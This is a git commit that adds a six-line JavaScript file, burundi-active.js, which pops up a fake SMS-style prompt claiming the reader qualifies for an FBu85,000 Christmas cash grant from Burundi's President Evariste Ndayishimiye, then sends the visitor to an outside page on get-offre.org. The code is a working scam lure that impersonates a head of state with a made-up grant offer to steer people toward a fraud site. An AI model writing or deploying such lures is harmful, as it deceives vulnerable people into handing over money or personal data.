22bef964ff723a19940fbaaa95ca67bcfb2fd1cd
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-11-25 21:53:19 -0800

    Create burundi-active.js

---
+++ burundi-active.js
@@ -0,0 +1,6 @@
+
+var password = 'WITHDRAW FBu85,000'
+password=prompt('SMS: Congratulations You are qualify for President EVARISTE NDAYISHIMIYE FBu85,000 CHRISTMAS CASH GRANT FOR BURUNDIANS, Kindly Press OK to Withdraw Cash Prize   ','WITHDRAW FBu85,000');
+if (password != 'WITHDRAW FBu85,000') {
+location.href='https://get-offre.org/burundi-grant.html';
+}
